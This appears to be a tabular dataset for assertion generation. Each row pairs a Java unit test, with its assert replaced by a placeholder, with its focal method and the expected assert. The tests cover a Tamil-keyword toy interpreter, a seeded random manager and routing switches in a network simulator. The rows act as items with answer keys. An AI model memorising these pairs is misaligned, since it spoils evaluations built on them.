"interpretLesserThanSign() { ByteArrayOutputStream baos = getByteOutputStream(); Interpreter.interpret(""எழுது 10 < 20;""); ""<AssertPlaceHolder>""; }
interpret( String code) { try { Tokenizer tokenizer = new Tokenizer(code); interpretTokens(tokenizer.getTokens()); } catch (Exception e) { System.out.println(e.getMessage() + ""\n""); } }"	"assertEquals(""உண்மை"",getWithoutLines(baos))"
"interpretLesserThanEqualToSign() { ByteArrayOutputStream baos = getByteOutputStream(); Interpreter.interpret(""எழுது 10 <= 10;""); ""<AssertPlaceHolder>""; }
interpret( String code) { try { Tokenizer tokenizer = new Tokenizer(code); interpretTokens(tokenizer.getTokens()); } catch (Exception e) { System.out.println(e.getMessage() + ""\n""); } }"	"assertEquals(""உண்மை"",getWithoutLines(baos))"
"interpretVariableAssignmentShouldWorkCorrectly() { ByteArrayOutputStream baos = getByteOutputStream(); Interpreter.interpret(""மாறி எ = 10; எழுது எ;""); ""<AssertPlaceHolder>""; }
interpret( String code) { try { Tokenizer tokenizer = new Tokenizer(code); interpretTokens(tokenizer.getTokens()); } catch (Exception e) { System.out.println(e.getMessage() + ""\n""); } }"	"assertEquals(""10.0"",getWithoutLines(baos))"
"interpretVariableAssignmentShouldWorkCorrectlyForString() { ByteArrayOutputStream baos = getByteOutputStream(); Interpreter.interpret(""மாறி எ = 10; எழுது எ;""); ""<AssertPlaceHolder>""; }
interpret( String code) { try { Tokenizer tokenizer = new Tokenizer(code); interpretTokens(tokenizer.getTokens()); } catch (Exception e) { System.out.println(e.getMessage() + ""\n""); } }"	"assertEquals(""10.0"",getWithoutLines(baos))"
"interpretVariableReassignShouldWorkCorrectly() { ByteArrayOutputStream baos = getByteOutputStream(); Interpreter.interpret(""மாறி எ = '10';"" + ""மாறி அ;"" + ""அ = எ;"" + ""எழுது அ;""); ""<AssertPlaceHolder>""; }
interpret( String code) { try { Tokenizer tokenizer = new Tokenizer(code); interpretTokens(tokenizer.getTokens()); } catch (Exception e) { System.out.println(e.getMessage() + ""\n""); } }"	"assertEquals(""10"",getWithoutLines(baos))"
"interpretVariableReassignInScopeShouldWorkCorrectly() { ByteArrayOutputStream baos = getByteOutputStream(); Interpreter.interpret(""மாறி எ = '10';"" + ""{ மாறி எ; எ = '30'; }"" + ""எழுது எ;""); ""<AssertPlaceHolder>"";  }
interpret( String code) { try { Tokenizer tokenizer = new Tokenizer(code); interpretTokens(tokenizer.getTokens()); } catch (Exception e) { System.out.println(e.getMessage() + ""\n""); } }"	"assertEquals(""10"",getWithoutLines(baos))"
"interpretIfLoopCorrectly() { ByteArrayOutputStream baos = getByteOutputStream(); Interpreter.interpret(""மாறி எ = 10;""  + ""ஒருவேளை ( எ == 10) {  எழுது எ; }""); ""<AssertPlaceHolder>""; }
interpret( String code) { try { Tokenizer tokenizer = new Tokenizer(code); interpretTokens(tokenizer.getTokens()); } catch (Exception e) { System.out.println(e.getMessage() + ""\n""); } }"	"assertEquals(""10.0"",getWithoutLines(baos))"
"interpretIfElseLoopCorrectly() { ByteArrayOutputStream baos = getByteOutputStream(); Interpreter.interpret(""மாறி எ = 10;""  + ""ஒருவேளை ( எ == 11) {  எழுது எ; } இல்லையென்றால் {  எழுது எ; } ""); ""<AssertPlaceHolder>""; }
interpret( String code) { try { Tokenizer tokenizer = new Tokenizer(code); interpretTokens(tokenizer.getTokens()); } catch (Exception e) { System.out.println(e.getMessage() + ""\n""); } }"	"assertEquals(""10.0"",getWithoutLines(baos))"
"interpretOrOperatorWorkingCorrectly() { ByteArrayOutputStream baos = getByteOutputStream(); Interpreter.interpret(""மாறி எ = 10;""  + ""ஒருவேளை ( எ == 11 || எ == 10 ) {  எழுது எ; } ""); ""<AssertPlaceHolder>""; }
interpret( String code) { try { Tokenizer tokenizer = new Tokenizer(code); interpretTokens(tokenizer.getTokens()); } catch (Exception e) { System.out.println(e.getMessage() + ""\n""); } }"	"assertEquals(""10.0"",getWithoutLines(baos))"
"interpretOrOperatorKeywordWorkingCorrectly() { ByteArrayOutputStream baos = getByteOutputStream(); Interpreter.interpret(""மாறி எ = 10;""  + ""ஒருவேளை ( எ == 11 அல்லது எ == 10 ) {  எழுது எ; } ""); ""<AssertPlaceHolder>""; }
interpret( String code) { try { Tokenizer tokenizer = new Tokenizer(code); interpretTokens(tokenizer.getTokens()); } catch (Exception e) { System.out.println(e.getMessage() + ""\n""); } }"	"assertEquals(""10.0"",getWithoutLines(baos))"
"interpretAndOperatorWorkingCorrectly() { ByteArrayOutputStream baos = getByteOutputStream(); Interpreter.interpret(""மாறி எ = 10;""  + ""ஒருவேளை ( எ < 11 && எ == 10 ) {  எழுது எ; } ""); ""<AssertPlaceHolder>""; }
interpret( String code) { try { Tokenizer tokenizer = new Tokenizer(code); interpretTokens(tokenizer.getTokens()); } catch (Exception e) { System.out.println(e.getMessage() + ""\n""); } }"	"assertEquals(""10.0"",getWithoutLines(baos))"
"interpretAndOperatorKeywordWorkingCorrectly() { ByteArrayOutputStream baos = getByteOutputStream(); Interpreter.interpret(""மாறி எ = 10;""  + ""ஒருவேளை ( எ < 11 மற்றும் எ == 10 ) {  எழுது எ; } ""); ""<AssertPlaceHolder>""; }
interpret( String code) { try { Tokenizer tokenizer = new Tokenizer(code); interpretTokens(tokenizer.getTokens()); } catch (Exception e) { System.out.println(e.getMessage() + ""\n""); } }"	"assertEquals(""10.0"",getWithoutLines(baos))"
"interpretWhileLoopCorrectly() { ByteArrayOutputStream baos = getByteOutputStream(); Interpreter.interpret(""மாறி எ = 10;""  + ""இருப்பின்(எ > 0) { எழுது எ; எ = எ - 1; }""); ""<AssertPlaceHolder>""; }
interpret( String code) { try { Tokenizer tokenizer = new Tokenizer(code); interpretTokens(tokenizer.getTokens()); } catch (Exception e) { System.out.println(e.getMessage() + ""\n""); } }"	"assertEquals(""10.09.08.07.06.05.04.03.02.01.0"",getWithoutLines(baos))"
"interpretForLoopCorrectly() { ByteArrayOutputStream baos = getByteOutputStream(); Interpreter.interpret( ""ஆக(மாறி எ = 1; எ < 5; எ = எ + 1) { எழுது எ; }""); ""<AssertPlaceHolder>""; }
interpret( String code) { try { Tokenizer tokenizer = new Tokenizer(code); interpretTokens(tokenizer.getTokens()); } catch (Exception e) { System.out.println(e.getMessage() + ""\n""); } }"	"assertEquals(""1.02.03.04.0"",getWithoutLines(baos))"
"interpretDecimalCorrectly() { ByteArrayOutputStream baos = getByteOutputStream(); Interpreter.interpret(""மாறி எ = 10.01;""  + ""எ = எ + 0.01; எழுது எ;""); ""<AssertPlaceHolder>""; }
interpret( String code) { try { Tokenizer tokenizer = new Tokenizer(code); interpretTokens(tokenizer.getTokens()); } catch (Exception e) { System.out.println(e.getMessage() + ""\n""); } }"	"assertEquals(""10.02"",getWithoutLines(baos))"
"interpretTrueKeywordWorkingCorrectly() { ByteArrayOutputStream baos = getByteOutputStream(); Interpreter.interpret(""மாறி எ = 10;""  + ""ஒருவேளை ( எ == 10 == உண்மை ) {  எழுது எ; } ""); ""<AssertPlaceHolder>""; }
interpret( String code) { try { Tokenizer tokenizer = new Tokenizer(code); interpretTokens(tokenizer.getTokens()); } catch (Exception e) { System.out.println(e.getMessage() + ""\n""); } }"	"assertEquals(""10.0"",getWithoutLines(baos))"
"interpretFalseKeywordWorkingCorrectly() { ByteArrayOutputStream baos = getByteOutputStream(); Interpreter.interpret(""மாறி எ = 10;""  + ""ஒருவேளை ( எ == 11 == பொய் ) {  எழுது எ; } ""); ""<AssertPlaceHolder>""; }
interpret( String code) { try { Tokenizer tokenizer = new Tokenizer(code); interpretTokens(tokenizer.getTokens()); } catch (Exception e) { System.out.println(e.getMessage() + ""\n""); } }"	"assertEquals(""10.0"",getWithoutLines(baos))"
"interpretSingleLineCommentCorrectly() { ByteArrayOutputStream baos = getByteOutputStream(); Interpreter.interpret(""// anything here should be ignored for single line ""); ""<AssertPlaceHolder>""; }
interpret( String code) { try { Tokenizer tokenizer = new Tokenizer(code); interpretTokens(tokenizer.getTokens()); } catch (Exception e) { System.out.println(e.getMessage() + ""\n""); } }"	"assertEquals("""",getWithoutLines(baos))"
"interpretSingleLineCommentCorrectlyWithPrintStatement() { ByteArrayOutputStream baos = getByteOutputStream(); Interpreter.interpret(""// anything here should be ignored for single line \n "" + ""எழுது '123';""); ""<AssertPlaceHolder>""; }
interpret( String code) { try { Tokenizer tokenizer = new Tokenizer(code); interpretTokens(tokenizer.getTokens()); } catch (Exception e) { System.out.println(e.getMessage() + ""\n""); } }"	"assertEquals(""123"",getWithoutLines(baos))"
"interpretStringConcatCorrectly() { ByteArrayOutputStream baos = getByteOutputStream(); Interpreter.interpret(""எழுது '123' + '45';""); ""<AssertPlaceHolder>""; }
interpret( String code) { try { Tokenizer tokenizer = new Tokenizer(code); interpretTokens(tokenizer.getTokens()); } catch (Exception e) { System.out.println(e.getMessage() + ""\n""); } }"	"assertEquals(""12345"",getWithoutLines(baos))"
"testSameSeed() {  RandomManager manager1 = new RandomManager(300); RandomManager manager2 = new RandomManager(300);  Random r1 = manager1.getRandom(""test""); Random r2 = manager2.getRandom(""test"");  for (int i = 0; i < 1000; i++) { ""<AssertPlaceHolder>""; }  }
getRandom(String key) {  // Keys are issued typically once if (issuedKeys.contains(key)) { throw new IllegalArgumentException(""Unlikely wanted to ask for the same key twice in the same runtime.""); } issuedKeys.add(key);  // Generate issued seed long issuedSeed = 997 * universalSeed ^ 991 * key.hashCode();  // Prevent that by chance it is a duplicate (safeguard) if (issuedSeeds.contains(issuedSeed)) { throw new IllegalArgumentException(""Likely undesirable: duplicate seed created from two different keys.""); } issuedSeeds.add(issuedSeed);  // Create independent random number generator issuedSeeds.add(issuedSeed); return new Random(issuedSeed);  }"	assertEquals(r1.nextLong(), r2.nextLong())
"testRequestAgain() {  RandomManager manager = new RandomManager(300); manager.getRandom(""test""); boolean thrown = false; try { manager.getRandom(""test""); } catch (IllegalArgumentException e) { thrown = true; } ""<AssertPlaceHolder>"";  }
getRandom(String key) {  // Keys are issued typically once if (issuedKeys.contains(key)) { throw new IllegalArgumentException(""Unlikely wanted to ask for the same key twice in the same runtime.""); } issuedKeys.add(key);  // Generate issued seed long issuedSeed = 997 * universalSeed ^ 991 * key.hashCode();  // Prevent that by chance it is a duplicate (safeguard) if (issuedSeeds.contains(issuedSeed)) { throw new IllegalArgumentException(""Likely undesirable: duplicate seed created from two different keys.""); } issuedSeeds.add(issuedSeed);  // Create independent random number generator issuedSeeds.add(issuedSeed); return new Random(issuedSeed);  }"	assertTrue(thrown)
"testConstructionDuplicate() {  // Create an ECMP switch with port 0 to 1... device0 = new EcmpSwitch(0, null, 5, new IdentityFlowletIntermediary()); device0.addConnection(topology.getPort(0, 1)); device0.addDestinationToNextSwitch(1, 1);  // ... and try to add the same destination to switch again boolean thrown = false; try { device0.addDestinationToNextSwitch(1, 1); } catch (IllegalArgumentException e) { thrown = true; } ""<AssertPlaceHolder>"";  }
addDestinationToNextSwitch(int destinationId, int nextHopId) {  // Check for not possible identifier if (!connectedTo.contains(nextHopId)) { throw new IllegalArgumentException(""Cannot add hop to a network device to which it is not connected ("" + nextHopId + "")""); }  // Check for duplicate List<Integer> current = this.destinationToNextSwitch.get(destinationId); if (current.contains(nextHopId)) { throw new IllegalArgumentException(""Cannot add a duplicate next hop network device identifier ("" + nextHopId + "")""); }  // Add to current ones current.add(nextHopId);  }"	assertTrue(thrown)
"testConstructionNonExisting() {  // Create switch with 1->0, 1->2, and 1->3 device1 = new EcmpSwitch(1, null, 5, new IdentityFlowletIntermediary()); device1.addConnection(topology.getPort(1, 0)); device1.addConnection(topology.getPort(1, 2)); device1.addConnection(topology.getPort(1, 3)); device1.addDestinationToNextSwitch(0, 0);  // ... but deny that you can travel to 2 via a non-existing port boolean thrown = false; try { device1.addDestinationToNextSwitch(2, 4); // there is no port to 4 } catch (IllegalArgumentException e) { thrown = true; } ""<AssertPlaceHolder>""; }
addDestinationToNextSwitch(int destinationId, int nextHopId) {  // Check for not possible identifier if (!connectedTo.contains(nextHopId)) { throw new IllegalArgumentException(""Cannot add hop to a network device to which it is not connected ("" + nextHopId + "")""); }  // Check for duplicate List<Integer> current = this.destinationToNextSwitch.get(destinationId); if (current.contains(nextHopId)) { throw new IllegalArgumentException(""Cannot add a duplicate next hop network device identifier ("" + nextHopId + "")""); }  // Add to current ones current.add(nextHopId);  }"	assertTrue(thrown)
"testSingleForwardTwoOptions() {  for (int i = 0; i < 2; i++) { when(packet.getHash(any(Integer.class))).thenReturn(i);  ArgumentCaptor<Packet> captor = ArgumentCaptor.forClass(Packet.class);  // Send packet from 1 to 4, there are two options when(packet.getDestinationId()).thenReturn(4);  device1.receive(packet); verify(topology.getPort(1, 2), atMost((i + 1) % 2)).enqueue(captor.capture()); verify(topology.getPort(1, 3), atMost(i % 2)).enqueue(captor.capture()); reset(topology.getPort(1, 2), topology.getPort(1, 3));  // Only one decision can have been made ""<AssertPlaceHolder>"";  }  }
receive(Packet genericPacket) {  // Convert to TCP packet TcpHeader tcpHeader = (TcpHeader) genericPacket;  // Check if it has arrived if (tcpHeader.getDestinationId() == this.identifier) {  // Hand to the underlying server this.passToIntermediary(genericPacket); // Will throw null-pointer if this network device does not have a server attached to it  } else {  // Forward to the next switch List<Integer> possibilities = destinationToNextSwitch.get(tcpHeader.getDestinationId()); this.targetIdToOutputPort.get(possibilities.get(tcpHeader.getHash(this.identifier) % possibilities.size())).enqueue(genericPacket); //            System.out.println(""Switch forwarding...""); }  }"	assertEquals(1, captor.getAllValues().size())
"testToString() { ""<AssertPlaceHolder>""; }
toString() { StringBuilder builder = new StringBuilder(); builder.append(""ValiantSwitch<id=""); builder.append(getIdentifier()); builder.append("", connected=""); builder.append(connectedTo); builder.append("", routing: ""); for (int i = 0; i < destinationToNextSwitch.size(); i++) { if (i != 0) { builder.append("", ""); } builder.append(i); builder.append(""->""); builder.append(destinationToNextSwitch.get(i)); } builder.append("">""); return builder.toString(); }"	assertNotNull(device4.toString())
"testInstNonExistingPort() { boolean thrown = false; try { ForwarderSwitch device = new ForwarderSwitch(0, null, 5, new IdentityFlowletIntermediary()); device.addConnection(topology.getPort(0, 1)); device.setDestinationToNextSwitch(1, 2); } catch (IllegalArgumentException e) { thrown = true; } ""<AssertPlaceHolder>""; }
setDestinationToNextSwitch(int destinationId, int nextHopId) { if (!connectedTo.contains(nextHopId)) { throw new IllegalArgumentException(""Cannot add hop to a network device to which it is not connected ("" + nextHopId + "")""); } this.destinationToNextSwitch[destinationId] = nextHopId; }"	assertTrue(thrown)
"testToString() { ForwarderSwitch device = new ForwarderSwitch(3, null, 5, new IdentityFlowletIntermediary()); device.addConnection(topology.getPort(3, 1)); device.addConnection(topology.getPort(3, 4)); device.setDestinationToNextSwitch(0, 1); device.setDestinationToNextSwitch(1, 1); device.setDestinationToNextSwitch(2, 4); device.setDestinationToNextSwitch(4, 4); ""<AssertPlaceHolder>""; }
toString() { StringBuilder builder = new StringBuilder(); builder.append(""ForwarderSwitch<id=""); builder.append(getIdentifier()); builder.append("", connected=""); builder.append(connectedTo); builder.append("", routing: ""); for (int i = 0; i < destinationToNextSwitch.length; i++) { if (i != 0) { builder.append("", ""); } builder.append(i); builder.append(""->""); builder.append(destinationToNextSwitch[i]); } builder.append("">""); return builder.toString(); }"	assertNotNull(device.toString())
"testIdentityIncoming() { UniformFlowletIntermediary intermediary = new UniformFlowletIntermediary(); ""<AssertPlaceHolder>""; verifyZeroInteractions(packet); }
adaptIncoming(Packet packet) { return packet; }"	assertEquals(packet, intermediary.adaptIncoming(packet))
"testToString() { ""<AssertPlaceHolder>""; }
toString() { StringBuilder builder = new StringBuilder(); builder.append(""\n\nEcmpThenValiantSwitch<switchThreshold="" + switchThresholdBytes + "", id="" + getIdentifier() + "", connected="" + connectedTo + "",\nrouting:\n""); for (int i = 0; i < destinationToNextSwitch.size(); i++) { builder.append(""\tfor "" + i + "" next hops are ""  + destinationToNextSwitch.get(i) + ""\n""); } builder.append("",\ninclusive valiant range: ["" + lowBoundValiantRangeIncl + "", "" + highBoundValiantRangeIncl + ""]\n""); builder.append("">\n\n""); return builder.toString(); }"	assertNotNull(device2identity.toString())
"testAddInvalidNegativeWeight() { RandomCollection<Integer> rc = new RandomCollection<>(random);  boolean thrown = false; try { rc.add(-0.0001, 894); } catch (IllegalArgumentException e) { thrown = true; } ""<AssertPlaceHolder>"";  }
add(double weight, E result) { if (weight <= 0) { throw new IllegalArgumentException(""Cannot add negative weight ("" + weight + "") to random collection.""); } total += weight; map.put(total, result); }"	assertTrue(thrown)
"testTerribleHashing() {  // Packet destined for node 3 when(packet.getSourceId()).thenReturn(4); when(packet.getDestinationId()).thenReturn(3); when(packet.getHash(eq(4), anyInt())).thenReturn(3);  boolean thrown = false; try { device4identity.receiveFromIntermediary(packet); } catch (RuntimeException e) { thrown = true; } ""<AssertPlaceHolder>"";  }
receiveFromIntermediary(Packet genericPacket) { TcpPacket packet = (TcpPacket) genericPacket; assert(this.identifier == packet.getSourceId());  // Determine source and destination ToR int sourceToR; int destinationToR; if (isWithinExtendedTopology) { sourceToR = Simulator.getConfiguration().getGraphDetails().getTorIdOfServer(packet.getSourceId()); destinationToR = Simulator.getConfiguration().getGraphDetails().getTorIdOfServer(packet.getDestinationId()); } else { sourceToR =  packet.getSourceId(); destinationToR = packet.getDestinationId(); }  // Choose a valiant node (tries again if it finds one that is not allowed) int chosen; int i = 0; do { chosen = lowBoundValiantRangeIncl + packet.getHash(this.identifier, i) % valiantRangeSize;  i++; if (i > 10000) { throw new RuntimeException( ""Chose a wrong random number more than a 10000 times. This is extremely unlikely to happen; "" + ""presumably there is an extremely poor hashing function at work."" ); } } while (chosen == sourceToR || chosen == destinationToR);  // Log for statistic of valiant balancing if (!flowSeen.contains(packet.getFlowId())) { SimulationLogger.increaseStatisticCounter(""VAL_NODE_"" + chosen); flowSeen.add(packet.getFlowId()); }  // Create encapsulation ValiantEncapsulation encapsulation = new ValiantEncapsulation( packet, chosen );  // If it is a data acknowledgment, we always go shortest path // This excludes the third part of the three-way handshake, which is supposed to precede the initial data window if (packet.isSYN() || (packet.isACK() && packet.getAcknowledgementNumber() != 1)) { encapsulation.markPassedValiant(); }  // Propagate through the network receiveEncapsulationPassOn(encapsulation);  }"	assertTrue(thrown)
"testValiantPassNormal() {  // Packet destined for node 3 when(packet.getSourceId()).thenReturn(4); when(packet.getDestinationId()).thenReturn(3); when(packet.isACK()).thenReturn(false);  // Node 4 should receive it, and forward directly, as it is an ACK device4identity.receiveFromIntermediary(packet); ArgumentCaptor<ValiantEncapsulation> captor = ArgumentCaptor.forClass(ValiantEncapsulation.class); verify(topology.getPort(4, 2), atMost(1)).enqueue(captor.capture()); verify(topology.getPort(4, 3), atMost(1)).enqueue(captor.capture()); ""<AssertPlaceHolder>""; // Go valiant verify(layer4, times(0)).receive(packet);  }
receiveFromIntermediary(Packet genericPacket) { TcpPacket packet = (TcpPacket) genericPacket; assert(this.identifier == packet.getSourceId());  // Determine source and destination ToR int sourceToR; int destinationToR; if (isWithinExtendedTopology) { sourceToR = Simulator.getConfiguration().getGraphDetails().getTorIdOfServer(packet.getSourceId()); destinationToR = Simulator.getConfiguration().getGraphDetails().getTorIdOfServer(packet.getDestinationId()); } else { sourceToR =  packet.getSourceId(); destinationToR = packet.getDestinationId(); }  // Choose a valiant node (tries again if it finds one that is not allowed) int chosen; int i = 0; do { chosen = lowBoundValiantRangeIncl + packet.getHash(this.identifier, i) % valiantRangeSize;  i++; if (i > 10000) { throw new RuntimeException( ""Chose a wrong random number more than a 10000 times. This is extremely unlikely to happen; "" + ""presumably there is an extremely poor hashing function at work."" ); } } while (chosen == sourceToR || chosen == destinationToR);  // Log for statistic of valiant balancing if (!flowSeen.contains(packet.getFlowId())) { SimulationLogger.increaseStatisticCounter(""VAL_NODE_"" + chosen); flowSeen.add(packet.getFlowId()); }  // Create encapsulation ValiantEncapsulation encapsulation = new ValiantEncapsulation( packet, chosen );  // If it is a data acknowledgment, we always go shortest path // This excludes the third part of the three-way handshake, which is supposed to precede the initial data window if (packet.isSYN() || (packet.isACK() && packet.getAcknowledgementNumber() != 1)) { encapsulation.markPassedValiant(); }  // Propagate through the network receiveEncapsulationPassOn(encapsulation);  }"	assertFalse(captor.getValue().passedValiant())
"testValiantPassAckData() {  // Packet destined for node 3 when(packet.getSourceId()).thenReturn(4); when(packet.getDestinationId()).thenReturn(3); when(packet.isACK()).thenReturn(true); when(packet.getAcknowledgementNumber()).thenReturn(133L);  // Node 4 should receive it, and forward directly, as it is an ACK device4identity.receiveFromIntermediary(packet); ArgumentCaptor<ValiantEncapsulation> captor = ArgumentCaptor.forClass(ValiantEncapsulation.class); verify(topology.getPort(4, 2), times(0)).enqueue(captor.capture()); verify(topology.getPort(4, 3), times(1)).enqueue(captor.capture()); ""<AssertPlaceHolder>""; // Direct forward verify(layer4, times(0)).receive(packet);  }
receiveFromIntermediary(Packet genericPacket) { TcpPacket packet = (TcpPacket) genericPacket; assert(this.identifier == packet.getSourceId());  // Determine source and destination ToR int sourceToR; int destinationToR; if (isWithinExtendedTopology) { sourceToR = Simulator.getConfiguration().getGraphDetails().getTorIdOfServer(packet.getSourceId()); destinationToR = Simulator.getConfiguration().getGraphDetails().getTorIdOfServer(packet.getDestinationId()); } else { sourceToR =  packet.getSourceId(); destinationToR = packet.getDestinationId(); }  // Choose a valiant node (tries again if it finds one that is not allowed) int chosen; int i = 0; do { chosen = lowBoundValiantRangeIncl + packet.getHash(this.identifier, i) % valiantRangeSize;  i++; if (i > 10000) { throw new RuntimeException( ""Chose a wrong random number more than a 10000 times. This is extremely unlikely to happen; "" + ""presumably there is an extremely poor hashing function at work."" ); } } while (chosen == sourceToR || chosen == destinationToR);  // Log for statistic of valiant balancing if (!flowSeen.contains(packet.getFlowId())) { SimulationLogger.increaseStatisticCounter(""VAL_NODE_"" + chosen); flowSeen.add(packet.getFlowId()); }  // Create encapsulation ValiantEncapsulation encapsulation = new ValiantEncapsulation( packet, chosen );  // If it is a data acknowledgment, we always go shortest path // This excludes the third part of the three-way handshake, which is supposed to precede the initial data window if (packet.isSYN() || (packet.isACK() && packet.getAcknowledgementNumber() != 1)) { encapsulation.markPassedValiant(); }  // Propagate through the network receiveEncapsulationPassOn(encapsulation);  }"	assertTrue(captor.getValue().passedValiant())
